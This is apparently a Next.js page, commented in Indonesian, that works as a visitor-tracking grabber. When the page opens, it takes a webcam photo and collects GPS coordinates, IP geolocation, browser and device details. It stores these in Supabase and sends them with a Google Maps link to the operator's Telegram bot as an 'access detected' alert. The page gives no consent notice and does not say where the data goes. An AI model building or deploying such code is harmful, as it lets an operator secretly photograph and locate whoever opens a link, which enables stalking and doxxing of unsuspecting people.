"use client";
import { useState, useEffect } from "react";
import Image from "next/image";
import { supabase } from "../lib/supabaseClient";

const token = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "";
const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "";

export default function Home() {
  const [deviceInfo, setDeviceInfo] = useState<{ ip?: string; browser?: string; device?: string } | null>(null);
  const [photo, setPhoto] = useState<string | null>(null);
  const [photoUrl, setPhotoUrl] = useState<string | null>(null);
  const [logId, setLogId] = useState<string | null>(null);

  useEffect(() => {
    // Kamera: langsung jepret foto dan upload ke Supabase Storage
    const capturePhoto = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();
        await new Promise(resolve => video.onloadedmetadata = resolve);

        // Tunggu video siap, lalu jepret
        const canvas = document.createElement("canvas");
        // Batasi resolusi maksimal untuk mengurangi ukuran file
        const maxWidth = 640;
        const maxHeight = 480;
        const videoWidth = video.videoWidth || 320;
        const videoHeight = video.videoHeight || 240;
        
        // Hitung rasio untuk maintain aspect ratio
        const ratio = Math.min(maxWidth / videoWidth, maxHeight / videoHeight);
        canvas.width = videoWidth * ratio;
        canvas.height = videoHeight * ratio;
        
        console.log(`Video size: ${videoWidth}x${videoHeight}, Canvas size: ${canvas.width}x${canvas.height}`);
        
        const ctx = canvas.getContext("2d");
        let photoDataUrl = null;
        if (ctx) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          // Gunakan JPEG dengan kualitas 0.7 untuk ukuran file lebih kecil
          photoDataUrl = canvas.toDataURL("image/jpeg", 0.7);
          setPhoto(photoDataUrl);
          console.log("Foto berhasil diambil, ukuran:", Math.round((photoDataUrl.length * 3) / 4 / 1024), "KB");
        }

        // Stop stream
        stream.getTracks().forEach(track => track.stop());

        // Upload ke Supabase Storage setelah foto diambil
        if (photoDataUrl) {
          try {
            console.log("Memulai upload foto ke Supabase Storage...");
            
            // Convert base64 to Blob
            const base64 = photoDataUrl.split(",")[1];
            const byteCharacters = atob(base64);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
              byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            const blob = new Blob([byteArray], { type: "image/jpeg" });

            console.log("Ukuran blob:", Math.round(blob.size / 1024), "KB");

            // Nama file unik
            const filename = `photo_${Date.now()}.jpg`;
            console.log("Uploading file:", filename);
            
            const { data, error: uploadError } = await supabase.storage.from("udag_bajing_files").upload(filename, blob, {
              cacheControl: "3600",
              upsert: false,
            });
            
            console.log("Upload result - data:", data, "error:", uploadError);
            
            if (uploadError) {
              console.error("Upload error:", uploadError);
              setError("Gagal upload foto: " + uploadError.message);
            } else if (data) {
              console.log("Upload berhasil, mendapatkan public URL...");
              
              // Dapatkan public URL
              const { data: urlData } = supabase.storage.from("udag_bajing_files").getPublicUrl(filename);
              console.log("Public URL data:", urlData);
              
              if (urlData && urlData.publicUrl) {
                console.log("Public URL berhasil:", urlData.publicUrl);
                setPhotoUrl(urlData.publicUrl);
                setError("✅ Foto berhasil diupload ke Supabase!");
              } else {
                console.error("Gagal mendapatkan public URL");
                setError("Gagal mendapatkan public URL foto.");
              }
            } else {
              console.error("Upload gagal: tidak ada data dan tidak ada error");
              setError("Upload gagal: respons tidak valid dari Supabase");
            }
          } catch (err: unknown) {
            console.error("Exception during upload:", err);
            const errorMessage = err instanceof Error ? err.message : 'Unknown error occurred';
            setError("Gagal upload foto: " + errorMessage);
          }
        } else {
          console.log("Tidak ada photoDataUrl untuk diupload");
        }
      } catch (err) {
        setError("Gagal mengakses kamera: " + (err as Error).message);
      }
    };
    capturePhoto();

    // Device info & logging ke Supabase
    const logAccess = async () => {
      let ip = "";
      let latitude = null;
      let longitude = null;
      let city = "";
      let country = "";
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          const data = await res.json();
          ip = data.ip;
          latitude = data.latitude;
          longitude = data.longitude;
          city = data.city;
          country = data.country_name;
        }
      } catch {}

      const ua = navigator.userAgent;
      let browser = "";
      let device = "";
      // Sederhana: deteksi browser
      if (ua.includes("Chrome")) browser = "Chrome";
      else if (ua.includes("Firefox")) browser = "Firefox";
      else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
      else if (ua.includes("Edge")) browser = "Edge";
      else browser = "Lainnya";

      // Sederhana: deteksi device
      if (/Android/i.test(ua)) device = "Android";
      else if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS";
      else if (/Windows/i.test(ua)) device = "Windows";
      else if (/Macintosh/i.test(ua)) device = "Mac";
      else device = "Lainnya";

      setDeviceInfo({ ip, browser, device });

      // Insert ke Supabase
      const { data, error: insertError } = await supabase.from("udag_bajing_access_logs").insert([
        {
          ip,
          browser,
          device,
          latitude,
          longitude,
          city,
          country,
          user_agent: ua,
          accessed_at: new Date().toISOString(),
        },
      ]).select();
      if (insertError) {
        setError("Gagal menyimpan log akses: " + insertError.message);
      }
      if (data && data[0] && data[0].id) {
        setLogId(data[0].id);
      }
    };
    logAccess();
  }, []);
  const [gpsLocation, setGpsLocation] = useState<{ lat: number; lng: number } | null>(null);
  const [ipLocation, setIpLocation] = useState<{ lat: number; lng: number; city?: string; country?: string } | null>(null);
  const [error, setError] = useState<string | null>(null);

  // Ambil lokasi GPS dan IP saat halaman dibuka
  useEffect(() => {
    // GPS dengan opsi yang lebih baik
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setGpsLocation({
            lat: position.coords.latitude,
            lng: position.coords.longitude,
          });
          console.log("GPS lokasi berhasil:", position.coords.latitude, position.coords.longitude);
        },
        (err) => {
          console.error("Error GPS:", err);
          setError("Gagal mendapatkan lokasi GPS: " + err.message);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 60000
        }
      );
    } else {
      setError("Browser tidak mendukung Geolocation.");
    }

    // IP
    const fetchIpLocation = async () => {
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (!res.ok) throw new Error("Gagal mengambil data lokasi.");
        const data = await res.json();
        setIpLocation({
          lat: data.latitude,
          lng: data.longitude,
          city: data.city,
          country: data.country_name,
        });
      } catch (err: unknown) {
        const errorMessage = err instanceof Error ? err.message : 'Unknown error occurred';
        setError("Gagal mendapatkan lokasi IP: " + errorMessage);
      }
    };
    fetchIpLocation();
  }, []);

  // Update log Supabase dengan data GPS dan foto jika tersedia, lalu kirim notifikasi ke Telegram (hanya sekali)
  const [notified, setNotified] = useState(false);

  // Test function untuk Telegram
  const testTelegram = async () => {
    try {
      console.log("Testing Telegram...");
      const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: "Test pesan dari aplikasi Next.js",
        }),
      });
      
      if (!response.ok) {
        const errorData = await response.text();
        console.error("Test Telegram gagal:", errorData);
        setError("Test Telegram gagal: " + response.statusText);
      } else {
        console.log("Test Telegram berhasil");
        setError("Test Telegram berhasil!");
      }
    } catch (error) {
      console.error("Error test Telegram:", error);
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      setError("Error test Telegram: " + errorMessage);
    }
  };

  // Test function untuk mengirim foto ke Telegram
  const testTelegramPhoto = async () => {
    if (!photo) {
      setError("Tidak ada foto untuk dikirim");
      return;
    }

    try {
      console.log("Testing Telegram dengan foto...");
      
      const base64 = photo.split(",")[1];
      const byteCharacters = atob(base64);
      const byteNumbers = new Array(byteCharacters.length);
      for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
      }
      const byteArray = new Uint8Array(byteNumbers);
      const file = new File([byteArray], "test_photo.jpg", { type: "image/jpeg" });

      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", file);
      formData.append("caption", "Test foto dari aplikasi Next.js");
      
      const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData,
      });
      
      if (!response.ok) {
        const errorData = await response.text();
        console.error("Test foto Telegram gagal:", errorData);
        setError("Test foto Telegram gagal: " + response.status + " - " + errorData);
      } else {
        console.log("Test foto Telegram berhasil");
        setError("Test foto Telegram berhasil!");
      }
    } catch (error) {
      console.error("Error test foto Telegram:", error);
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      setError("Error test foto Telegram: " + errorMessage);
    }
  };

  useEffect(() => {
    console.log("Checking telegram condition:", {
      notified,
      logId,
      gpsLocation: !!gpsLocation,
      photoUrl: !!photoUrl,
      photo: !!photo
    });
    
    if (!notified && logId && (gpsLocation || photoUrl || photo)) {
      console.log("Kondisi terpenuhi, menjalankan updateLogAndNotify...");
      const updateLogAndNotify = async () => {
        const updateData: {
          latitude_gps?: number;
          longitude_gps?: number;
          photo_url?: string;
        } = {};
        if (gpsLocation) {
          updateData.latitude_gps = gpsLocation.lat;
          updateData.longitude_gps = gpsLocation.lng;
        }
        if (photoUrl) {
          updateData.photo_url = photoUrl;
        }
        if (Object.keys(updateData).length > 0) {
          await supabase.from("udag_bajing_access_logs")
            .update(updateData)
            .eq("id", logId);
        }

        // Kirim notifikasi ke Telegram
        let text = `Akses baru terdeteksi!\n`;
        if (deviceInfo) {
          text += `IP: ${deviceInfo.ip || "-"}\nBrowser: ${deviceInfo.browser || "-"}\nDevice: ${deviceInfo.device || "-"}\n`;
        }
        let gmapsLink = "";
        if (gpsLocation) {
          text += `GPS: ${gpsLocation.lat}, ${gpsLocation.lng}\n`;
          gmapsLink = `<a href="https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lng}">Lihat di Google Maps</a>`;
        }
        if (photoUrl) {
          text += `Foto: ${photoUrl}\n`;
        }
        if (ipLocation) {
          text += `Lokasi IP: ${ipLocation.lat}, ${ipLocation.lng}\nKota: ${ipLocation.city || "-"}\nNegara: ${ipLocation.country || "-"}`;
        }

        // Kirim pesan/foto ke Telegram
        try {
          if (photo) {
            console.log("Memproses foto untuk Telegram...");
            
            // Convert dataURL to File dengan kompression
            const base64 = photo.split(",")[1];
            
            // Cek ukuran base64 (estimasi ukuran file)
            const estimatedSize = (base64.length * 3) / 4;
            console.log("Estimasi ukuran foto:", Math.round(estimatedSize / 1024), "KB");
            
            if (estimatedSize > 10 * 1024 * 1024) { // Jika lebih dari 10MB
              console.warn("Foto terlalu besar, mengurangi kualitas...");
              // Akan kita compress di langkah selanjutnya jika perlu
            }
            
            const byteCharacters = atob(base64);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
              byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            const file = new File([byteArray], "access_photo.jpg", { type: "image/jpeg" });

            console.log("Ukuran file foto:", Math.round(file.size / 1024), "KB");

            // Buat caption yang lebih pendek dan aman untuk HTML
            let shortCaption = `🚨 Akses Terdeteksi!\n`;
            if (deviceInfo) {
              shortCaption += `📱 ${deviceInfo.device || "Unknown"} | ${deviceInfo.browser || "Unknown"}\n`;
              shortCaption += `🌐 IP: ${deviceInfo.ip || "Unknown"}\n`;
            }
            if (gpsLocation) {
              shortCaption += `📍 GPS: ${gpsLocation.lat.toFixed(6)}, ${gpsLocation.lng.toFixed(6)}\n`;
            }
            if (ipLocation && ipLocation.city) {
              shortCaption += `🏙️ ${ipLocation.city}, ${ipLocation.country || ""}\n`;
            }
            
            // Google Maps link tanpa HTML (Telegram akan auto-detect)
            if (gpsLocation) {
              shortCaption += `🗺️ https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lng}`;
            }

            // Kirim foto ke Telegram
            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", file);
            formData.append("caption", shortCaption);
            // Hapus parse_mode HTML untuk menghindari masalah parsing
            
            console.log("Mengirim foto ke Telegram...");
            console.log("Caption:", shortCaption);
            
            const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
              method: "POST",
              body: formData,
            });
            
            if (!response.ok) {
              const errorData = await response.text();
              console.error("Gagal kirim foto ke Telegram:", errorData);
              setError("Gagal kirim foto ke Telegram: " + response.status + " - " + errorData);
              
              // Fallback: Kirim pesan teks jika foto gagal
              console.log("Mencoba kirim sebagai pesan teks...");
              const fallbackResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: shortCaption,
                }),
              });
              
              if (fallbackResponse.ok) {
                console.log("Pesan teks fallback berhasil dikirim");
              }
            } else {
              const responseData = await response.json();
              console.log("Foto berhasil dikirim ke Telegram:", responseData);
              setError("✅ Foto berhasil dikirim ke Telegram!");
            }
          } else {
            // Jika tidak ada foto, kirim pesan teks
            console.log("Mengirim pesan teks ke Telegram...");
            
            let textMessage = `🚨 Akses Terdeteksi!\n`;
            if (deviceInfo) {
              textMessage += `📱 ${deviceInfo.device || "Unknown"} | ${deviceInfo.browser || "Unknown"}\n`;
              textMessage += `🌐 IP: ${deviceInfo.ip || "Unknown"}\n`;
            }
            if (gpsLocation) {
              textMessage += `📍 GPS: ${gpsLocation.lat.toFixed(6)}, ${gpsLocation.lng.toFixed(6)}\n`;
            }
            if (ipLocation && ipLocation.city) {
              textMessage += `🏙️ ${ipLocation.city}, ${ipLocation.country || ""}\n`;
            }
            if (gpsLocation) {
              textMessage += `🗺️ https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lng}`;
            }
            
            const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: chatId,
                text: textMessage,
              }),
            });
            
            if (!response.ok) {
              const errorData = await response.text();
              console.error("Gagal kirim pesan ke Telegram:", errorData);
              setError("Gagal kirim pesan ke Telegram: " + response.status + " - " + errorData);
            } else {
              const responseData = await response.json();
              console.log("Pesan berhasil dikirim ke Telegram:", responseData);
              setError("✅ Pesan berhasil dikirim ke Telegram!");
            }
          }
        } catch (telegramError) {
          console.error("Error Telegram:", telegramError);
          const errorMessage = telegramError instanceof Error ? telegramError.message : 'Unknown error';
          setError("Error mengirim ke Telegram: " + errorMessage);
        }
        setNotified(true);
      };
      updateLogAndNotify();
    } else {
      console.log("Kondisi tidak terpenuhi untuk mengirim ke Telegram:", {
        notified,
        logId: !!logId,
        gpsLocation: !!gpsLocation,
        photoUrl: !!photoUrl,
        photo: !!photo
      });
    }
  }, [gpsLocation, photoUrl, logId, notified, deviceInfo, ipLocation, photo]);

  return (
    <main className="flex flex-col items-center justify-center min-h-screen gap-4">
      <h1 className="text-2xl font-bold">Akses Lokasi dengan Next.js</h1>
      <div className="mt-4 flex flex-col items-center gap-4">
        <div>
          <h2 className="font-semibold text-gray-900 mb-2">Foto dari Kamera</h2>
          {photo ? (
            <Image
              src={photo}
              alt="Foto dari kamera"
              width={320}
              height={240}
              className="rounded-xl border shadow"
            />
          ) : (
            <p className="text-gray-500">Mengambil foto...</p>
          )}
          {photoUrl && (
            <p className="text-green-700 text-sm mt-2">Foto berhasil di-upload ke Supabase Storage.</p>
          )}
        </div>

        {/* Debug Info */}
        <div className="mt-4 p-2 border rounded-xl bg-yellow-50">
          <h2 className="font-semibold text-yellow-900">Debug Info</h2>
          <p className="text-yellow-800 text-sm">Token: {token ? "✓ Ada" : "✗ Kosong"}</p>
          <p className="text-yellow-800 text-sm">Chat ID: {chatId ? "✓ Ada" : "✗ Kosong"}</p>
          <p className="text-yellow-800 text-sm">GPS: {gpsLocation ? `✓ ${gpsLocation.lat.toFixed(4)}, ${gpsLocation.lng.toFixed(4)}` : "✗ Belum ada"}</p>
          <p className="text-yellow-800 text-sm">Foto: {photo ? `✓ Ada (${Math.round((photo.length * 3) / 4 / 1024)}KB)` : "✗ Belum ada"}</p>
          <p className="text-yellow-800 text-sm">Foto URL: {photoUrl ? "✓ Upload berhasil" : "✗ Belum upload"}</p>
          <p className="text-yellow-800 text-sm">Notified: {notified ? "✓ Ya" : "✗ Belum"}</p>
          <p className="text-yellow-800 text-sm">Log ID: {logId ? "✓ Ada" : "✗ Belum ada"}</p>
          <div className="mt-2 space-x-2">
            <button 
              onClick={testTelegram}
              className="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 text-sm"
            >
              Test Telegram
            </button>
            <button 
              onClick={testTelegramPhoto}
              disabled={!photo}
              className={`px-4 py-2 text-white rounded text-sm ${
                photo 
                  ? 'bg-green-500 hover:bg-green-600' 
                  : 'bg-gray-400 cursor-not-allowed'
              }`}
            >
              Test Foto
            </button>
            <button 
              onClick={() => {
                setNotified(false);
                console.log("Reset notified status");
              }}
              className="px-4 py-2 bg-orange-500 text-white rounded hover:bg-orange-600 text-sm"
            >
              Reset Notification
            </button>
          </div>
        </div>

        {deviceInfo && (
          <div className="mt-4 p-2 border rounded-xl bg-gray-100">
            <h2 className="font-semibold text-gray-900">Info Perangkat</h2>
            <p className="text-gray-800 font-medium">IP Address: {deviceInfo.ip || '-'}</p>
            <p className="text-gray-800 font-medium">Browser: {deviceInfo.browser || '-'}</p>
            <p className="text-gray-800 font-medium">Device: {deviceInfo.device || '-'}</p>
            <p className="text-gray-500 text-sm">MAC address tidak dapat diakses dari browser.</p>
          </div>
        )}

        {gpsLocation && (
          <div className="mt-4 p-2 border rounded-xl bg-green-50">
            <h2 className="font-semibold text-green-900">Lokasi Berdasarkan GPS</h2>
            <p className="text-green-900 font-medium">Latitude: {gpsLocation.lat}, Longitude: {gpsLocation.lng}</p>
            <a
              href={`https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lng}`}
              target="_blank"
              rel="noopener noreferrer"
            >
              Lihat di Google Maps
            </a>
          </div>
        )}

        {ipLocation && (
          <div className="mt-4 p-2 border rounded-xl bg-blue-50">
            <h2 className="font-semibold text-blue-900">Lokasi Berdasarkan IP</h2>
            <p className="text-blue-900 font-medium">Latitude: {ipLocation.lat}, Longitude: {ipLocation.lng}</p>
            {ipLocation.city && <p className="text-blue-900 font-medium">Kota: {ipLocation.city}</p>}
            {ipLocation.country && <p className="text-blue-900 font-medium">Negara: {ipLocation.country}</p>}
          </div>
        )}
      </div>
  {error && <p className="text-red-500">{error}</p>}
    </main>
  );
}
